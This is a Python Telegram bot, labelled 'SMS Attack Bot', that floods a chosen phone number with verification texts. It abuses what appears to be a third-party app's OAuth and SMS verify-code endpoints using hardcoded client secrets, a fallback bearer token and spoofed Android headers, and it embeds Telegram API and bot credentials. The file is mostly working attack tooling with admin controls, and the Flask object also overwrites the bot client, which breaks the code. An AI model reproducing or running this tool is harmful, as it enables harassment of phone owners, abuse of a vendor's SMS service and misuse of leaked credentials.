import requests
import json
import time
import asyncio
from pyrogram import Client, filters
from pyrogram.types import Message, InlineKeyboardButton, InlineKeyboardMarkup
from pyrogram.enums import ParseMode
import sqlite3
import os

# Configuration
API_ID = 25009640
API_HASH = "c55f00011863ecc5a0a6e5f194e725ab"
BOT_TOKEN = "8400364063:AAE17VP571eUnTPX6YxyIhWetKVjjVfdJLo"
ADMIN_IDS = [8331345905]  # Your admin ID

# Global variables
active_attacks = {}
app = Client("sms_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

from flask import Flask
from threading import Thread


app = Flask('')

@app.route('/')
def home():
    return "Bot is running"

def run_flask():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    Thread(target=run_flask).start()
    
# Initialize database
def init_db():
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS banned_users
                 (user_id INTEGER PRIMARY KEY, reason TEXT, banned_by INTEGER, banned_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    c.execute('''CREATE TABLE IF NOT EXISTS admin_users
                 (user_id INTEGER PRIMARY KEY, added_by INTEGER, added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    conn.commit()
    conn.close()

# Add initial admin to database
init_db()
conn = sqlite3.connect('bot_data.db')
c = conn.cursor()
for admin_id in ADMIN_IDS:
    c.execute("INSERT OR IGNORE INTO admin_users (user_id, added_by) VALUES (?, ?)", (admin_id, admin_id))
conn.commit()
conn.close()

# Check if user is admin
def is_admin(user_id):
    if user_id in ADMIN_IDS:
        return True
    
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute("SELECT * FROM admin_users WHERE user_id=?", (user_id,))
    result = c.fetchone()
    conn.close()
    
    return result is not None

# Check if user is banned
def is_banned(user_id):
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute("SELECT * FROM banned_users WHERE user_id=?", (user_id,))
    result = c.fetchone()
    conn.close()
    
    return result is not None

# Function to send SMS
def send_sms(phone_number):
    data = json.dumps({
        "client_id": "1279591103854574912",
        "client_secret": "F7B21E777586061D3098A26B22EA7E146C5BEAB18923CA71F42BBE506AF74C88",
        "grant_type": "client_credentials",
        "useJwt": 1
    })
    
    hed = {
        'User-Agent': "okhttp/3.14.9",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "gzip",
        'Content-Type': "application/json",
        'app_id': "109539233",
        'appVersion': "10.2.10",
        'appId': "109539233",
        'client_id': "1279591103854574912",
        'productId': "388421841221757641",
        'packageName': "com.sadidleee.app",
        'sdkPlatform': "Android",
        'sdkPlatformVersion': "10",
        'sdkServiceName': "agconnect-credential",
        'sdkType': "Java",
        'sdkVersion': "1.9.1.300"
    }
    
    try:
        req = requests.post("https://connect-dre.dbankcloud.cn/agc/apigw/oauth2/v1/token", data=data, headers=hed, timeout=10)
        try:
            token = req.json()['access_token']
        except:
            token = "eyJraWQiOiI1SURXMlRUOTdTY1JjemZmZXpmMWlsd2plSFI5RXYzcSIsInR5cCI6IkpXVCIsImFsZyI6IkhTMjU2In0.eyJzdWIiOiIxMjc5NTkxMTAzODU0NTc0OTEyIiwiY2xpZW50X3R5cGUiOjAsImV4cCI6MTcyNDE4NDYwOSwiaWF0IjoxNzI0MTcwMjA5fQ.l7WTKJMFRiIoaFN-PVdyIBoHsEmB5Pv8NXKwqbCvMrs"
    except:
        token = "eyJraWQiOiI1SURXMlRUOTdTY1JjemZmZXpmMWlsd2plSFI5RXYzcSIsInR5cCI6IkpXVCIsImFsZyI6IkhTMjU2In0.eyJzdWIiOiIxMjc5NTkxMTAzODU0NTc0OTEyIiwiY2xpZW50X3R5cGUiOjAsImV4cCI6MTcyNDE4NDYwOSwiaWF0IjoxNzI0MTcwMjA5fQ.l7WTKJMFRiIoaFN-PVdyIBoHsEmB5Pv8NXKwqbCvMrs"
    
    url = "https://connect-dre.dbankcloud.cn/agc/apigw/oauth2/third/v1/verify-code"
    
    params = {
        'productId': "388421841221757641"
    }
    
    payload = json.dumps({
        "action": 1001,
        "email": None,
        "lang": "ar_YE",
        "phone": f"{phone_number}",
        "sendInterval": 30
    })
    
    headers = {
        'User-Agent': "okhttp/3.14.9",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "gzip",
        'Content-Type': "application/json",
        'app_id': "109539233",
        'appVersion': "10.2.10",
        'appId': "109539233",
        'client_id': "1279591103854574912",
        'productId': "388421841221757641",
        'packageName': "com.sadidleee.app",
        'sdkPlatform': "Android",
        'sdkPlatformVersion': "10",
        'sdkServiceName': "agconnect-auth",
        'sdkType': "Java",
        'sdkVersion': "1.9.1.300",
        'Authorization': f"Bearer {token}"
    }
    
    try:
        response = requests.post(url, params=params, data=payload, headers=headers, timeout=10)
        return response.text
    except Exception as e:
        return f"Error: {str(e)}"

# Background task for sending SMS
async def sms_attack(phone_number, attack_id, message: Message):
    count = 0
    while attack_id in active_attacks:
        try:
            result = send_sms(phone_number)
            count += 1
            if count % 5 == 0:  # Update every 5 messages
                await message.edit_text(f"📱 SMS Attack on {phone_number}\n✅ Messages sent: {count}\n⏰ Status: Active")
            await asyncio.sleep(10)  # 10 seconds delay
        except Exception as e:
            await message.reply_text(f"❌ Error in attack: {str(e)}")
            break
    
    if attack_id in active_attacks:
        del active_attacks[attack_id]
    await message.edit_text(f"📱 SMS Attack on {phone_number}\n✅ Messages sent: {count}\n⏰ Status: Stopped")

# Telegram bot commands
@app.on_message(filters.command("start") & filters.private)
async def start_command(client, message: Message):
    if is_banned(message.from_user.id):
        await message.reply_text("❌ You are banned from using this bot.")
        return
    
    help_text = """
🤖 **SMS Attack Bot**

**BOT BY** : [#𝗥𝗔𝗗𝗛𝗘𝗬 ](t.me/boloradhey)

**Available commands:**
/start - Show this help message
/attack [phone] - Start SMS attack on a phone number
/stop [id] - Stop a specific attack
/status - Show all active attacks
/stopall - Stop all active attacks

**Example:**
/attack 1234567890
"""
    await message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN)

@app.on_message(filters.command("attack") & filters.private)
async def attack_command(client, message: Message):
    if is_banned(message.from_user.id):
        await message.reply_text("❌ You are banned from using this bot.")
        return
    
    if not is_admin(message.from_user.id):
        await message.reply_text("❌ You are not authorized to use this command.")
        return
    
    if len(message.command) < 2:
        await message.reply_text("❌ Please provide a phone number.\nExample: /attack 1234567890")
        return
    
    phone_number = message.command[1]
    
    if '+' in phone_number:
        await message.reply_text("❌ Invalid phone number format. Don't include '+'.")
        return
    
    # Generate attack ID
    attack_id = str(int(time.time()))
    active_attacks[attack_id] = phone_number
    
    # Send initial message
    status_message = await message.reply_text(f"📱 Starting SMS Attack on {phone_number}\n✅ Messages sent: 0\n⏰ Status: Starting...")
    
    # Start attack in background
    asyncio.create_task(sms_attack(phone_number, attack_id, status_message))
    
    await message.reply_text(f"✅ Attack started with ID: {attack_id}\nUse /stop {attack_id} to stop this attack.")

@app.on_message(filters.command("stop") & filters.private)
async def stop_command(client, message: Message):
    if is_banned(message.from_user.id):
        await message.reply_text("❌ You are banned from using this bot.")
        return
    
    if not is_admin(message.from_user.id):
        await message.reply_text("❌ You are not authorized to use this command.")
        return
    
    if len(message.command) < 2:
        await message.reply_text("❌ Please provide an attack ID.\nExample: /stop 1234567890")
        return
    
    attack_id = message.command[1]
    
    if attack_id in active_attacks:
        del active_attacks[attack_id]
        await message.reply_text(f"✅ Attack {attack_id} has been stopped.")
    else:
        await message.reply_text("❌ Attack ID not found or already stopped.")

@app.on_message(filters.command("stopall") & filters.private)
async def stopall_command(client, message: Message):
    if is_banned(message.from_user.id):
        await message.reply_text("❌ You are banned from using this bot.")
        return
    
    if not is_admin(message.from_user.id):
        await message.reply_text("❌ You are not authorized to use this command.")
        return
    
    count = len(active_attacks)
    active_attacks.clear()
    await message.reply_text(f"✅ Stopped all attacks. {count} attacks were stopped.")

@app.on_message(filters.command("status") & filters.private)
async def status_command(client, message: Message):
    if is_banned(message.from_user.id):
        await message.reply_text("❌ You are banned from using this bot.")
        return
    
    if not is_admin(message.from_user.id):
        await message.reply_text("❌ You are not authorized to use this command.")
        return
    
    if not active_attacks:
        await message.reply_text("📊 No active attacks.")
        return
    
    status_text = "📊 Active Attacks:\n\n"
    for attack_id, phone_number in active_attacks.items():
        status_text += f"🔹 ID: {attack_id}\n📱 Target: {phone_number}\n\n"
    
    await message.reply_text(status_text)

@app.on_message(filters.command("admin") & filters.private)
async def admin_command(client, message: Message):
    if is_banned(message.from_user.id):
        await message.reply_text("❌ You are banned from using this bot.")
        return
    
    if not is_admin(message.from_user.id):
        await message.reply_text("❌ You are not authorized to use this command.")
        return
    
    admin_text = """
🛠️ Admin Commands:

/attack [phone] - Start SMS attack on a phone number
/stop [id] - Stop a specific attack
/status - Show all active attacks
/stopall - Stop all active attacks
/broadcast [message] - Broadcast message to all users
/ban [user_id] [reason] - Ban a user from using the bot
/unban [user_id] - Unban a user
/addadmin [user_id] - Add a new admin
/removeadmin [user_id] - Remove an admin
/stats - Show bot statistics
"""
    await message.reply_text(admin_text, parse_mode=ParseMode.MARKDOWN)

@app.on_message(filters.command("broadcast") & filters.private)
async def broadcast_command(client, message: Message):
    if is_banned(message.from_user.id):
        await message.reply_text("❌ You are banned from using this bot.")
        return
    
    if not is_admin(message.from_user.id):
        await message.reply_text("❌ You are not authorized to use this command.")
        return
    
    if len(message.command) < 2:
        await message.reply_text("❌ Please provide a message to broadcast.")
        return
    
    broadcast_message = " ".join(message.command[1:])
    
    # Get all users who have started the bot
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    
    # We'll store user IDs in a separate table for broadcasting
    c.execute('''CREATE TABLE IF NOT EXISTS bot_users
                 (user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT, last_name TEXT, started_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    
    # Add current user if not exists
    c.execute("INSERT OR IGNORE INTO bot_users (user_id, username, first_name, last_name) VALUES (?, ?, ?, ?)",
              (message.from_user.id, message.from_user.username, message.from_user.first_name, message.from_user.last_name))
    conn.commit()
    
    # Get all users
    c.execute("SELECT user_id FROM bot_users")
    users = c.fetchall()
    conn.close()
    
    if not users:
        await message.reply_text("❌ No users found to broadcast to.")
        return
    
    success = 0
    failed = 0
    total = len(users)
    
    status_msg = await message.reply_text(f"📢 Broadcasting to {total} users...\n✅ Success: 0\n❌ Failed: 0")
    
    for user_id in users:
        try:
            await client.send_message(user_id[0], f"📢 Broadcast from Admin:\n\n{broadcast_message}")
            success += 1
        except:
            failed += 1
        
        if (success + failed) % 10 == 0:
            await status_msg.edit_text(f"📢 Broadcasting to {total} users...\n✅ Success: {success}\n❌ Failed: {failed}")
    
    await status_msg.edit_text(f"📢 Broadcast completed!\n✅ Success: {success}\n❌ Failed: {failed}")

@app.on_message(filters.command("ban") & filters.private)
async def ban_command(client, message: Message):
    if is_banned(message.from_user.id):
        await message.reply_text("❌ You are banned from using this bot.")
        return
    
    if not is_admin(message.from_user.id):
        await message.reply_text("❌ You are not authorized to use this command.")
        return
    
    if len(message.command) < 2:
        await message.reply_text("❌ Please provide a user ID to ban.")
        return
    
    try:
        user_id = int(message.command[1])
        reason = " ".join(message.command[2:]) if len(message.command) > 2 else "No reason provided"
        
        if is_admin(user_id):
            await message.reply_text("❌ Cannot ban another admin.")
            return
        
        conn = sqlite3.connect('bot_data.db')
        c = conn.cursor()
        c.execute("INSERT OR REPLACE INTO banned_users (user_id, reason, banned_by) VALUES (?, ?, ?)",
                  (user_id, reason, message.from_user.id))
        conn.commit()
        conn.close()
        
        await message.reply_text(f"✅ User {user_id} has been banned.\nReason: {reason}")
        
        # Notify the banned user if possible
        try:
            await client.send_message(user_id, f"❌ You have been banned from using this bot.\nReason: {reason}")
        except:
            pass
            
    except ValueError:
        await message.reply_text("❌ Invalid user ID. Please provide a numeric user ID.")

@app.on_message(filters.command("unban") & filters.private)
async def unban_command(client, message: Message):
    if is_banned(message.from_user.id):
        await message.reply_text("❌ You are banned from using this bot.")
        return
    
    if not is_admin(message.from_user.id):
        await message.reply_text("❌ You are not authorized to use this command.")
        return
    
    if len(message.command) < 2:
        await message.reply_text("❌ Please provide a user ID to unban.")
        return
    
    try:
        user_id = int(message.command[1])
        
        conn = sqlite3.connect('bot_data.db')
        c = conn.cursor()
        c.execute("DELETE FROM banned_users WHERE user_id=?", (user_id,))
        conn.commit()
        conn.close()
        
        await message.reply_text(f"✅ User {user_id} has been unbanned.")
        
        # Notify the unbanned user if possible
        try:
            await client.send_message(user_id, "✅ You have been unbanned from the bot. You can now use it again.")
        except:
            pass
            
    except ValueError:
        await message.reply_text("❌ Invalid user ID. Please provide a numeric user ID.")

@app.on_message(filters.command("addadmin") & filters.private)
async def addadmin_command(client, message: Message):
    if is_banned(message.from_user.id):
        await message.reply_text("❌ You are banned from using this bot.")
        return
    
    if message.from_user.id not in ADMIN_IDS:  # Only original admin can add new admins
        await message.reply_text("❌ You are not authorized to use this command.")
        return
    
    if len(message.command) < 2:
        await message.reply_text("❌ Please provide a user ID to add as admin.")
        return
    
    try:
        user_id = int(message.command[1])
        
        conn = sqlite3.connect('bot_data.db')
        c = conn.cursor()
        c.execute("INSERT OR IGNORE INTO admin_users (user_id, added_by) VALUES (?, ?)",
                  (user_id, message.from_user.id))
        conn.commit()
        conn.close()
        
        await message.reply_text(f"✅ User {user_id} has been added as admin.")
        
        # Notify the new admin if possible
        try:
            await client.send_message(user_id, "✅ You have been added as an admin to the SMS Attack Bot.")
        except:
            pass
            
    except ValueError:
        await message.reply_text("❌ Invalid user ID. Please provide a numeric user ID.")

@app.on_message(filters.command("removeadmin") & filters.private)
async def removeadmin_command(client, message: Message):
    if is_banned(message.from_user.id):
        await message.reply_text("❌ You are banned from using this bot.")
        return
    
    if message.from_user.id not in ADMIN_IDS:  # Only original admin can remove admins
        await message.reply_text("❌ You are not authorized to use this command.")
        return
    
    if len(message.command) < 2:
        await message.reply_text("❌ Please provide a user ID to remove from admins.")
        return
    
    try:
        user_id = int(message.command[1])
        
        if user_id in ADMIN_IDS:
            await message.reply_text("❌ Cannot remove original admin.")
            return
        
        conn = sqlite3.connect('bot_data.db')
        c = conn.cursor()
        c.execute("DELETE FROM admin_users WHERE user_id=?", (user_id,))
        conn.commit()
        conn.close()
        
        await message.reply_text(f"✅ User {user_id} has been removed from admins.")
        
        # Notify the removed admin if possible
        try:
            await client.send_message(user_id, "❌ You have been removed as an admin from the SMS Attack Bot.")
        except:
            pass
            
    except ValueError:
        await message.reply_text("❌ Invalid user ID. Please provide a numeric user ID.")

@app.on_message(filters.command("stats") & filters.private)
async def stats_command(client, message: Message):
    if is_banned(message.from_user.id):
        await message.reply_text("❌ You are banned from using this bot.")
        return
    
    if not is_admin(message.from_user.id):
        await message.reply_text("❌ You are not authorized to use this command.")
        return
    
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    
    # Get total users
    c.execute("SELECT COUNT(*) FROM bot_users")
    total_users = c.fetchone()[0]
    
    # Get total admins
    c.execute("SELECT COUNT(*) FROM admin_users")
    total_admins = c.fetchone()[0]
    
    # Get total banned users
    c.execute("SELECT COUNT(*) FROM banned_users")
    total_banned = c.fetchone()[0]
    
    conn.close()
    
    stats_text = f"""
📊 Bot Statistics:

👥 Total Users: {total_users}
🛠️ Total Admins: {total_admins}
🚫 Total Banned: {total_banned}
📱 Active Attacks: {len(active_attacks)}
"""
    await message.reply_text(stats_text)

# Store user info when they start the bot
@app.on_message(filters.private & ~filters.command)
async def store_user_info(client, message: Message):
    if is_banned(message.from_user.id):
        return
    
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS bot_users
                 (user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT, last_name TEXT, started_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    c.execute("INSERT OR IGNORE INTO bot_users (user_id, username, first_name, last_name) VALUES (?, ?, ?, ?)",
              (message.from_user.id, message.from_user.username, message.from_user.first_name, message.from_user.last_name))
    conn.commit()
    conn.close()

# Run the bot
if __name__ == "__main__":
    print("🤖 SMS Attack Telegram Bot is starting...")
    app.run()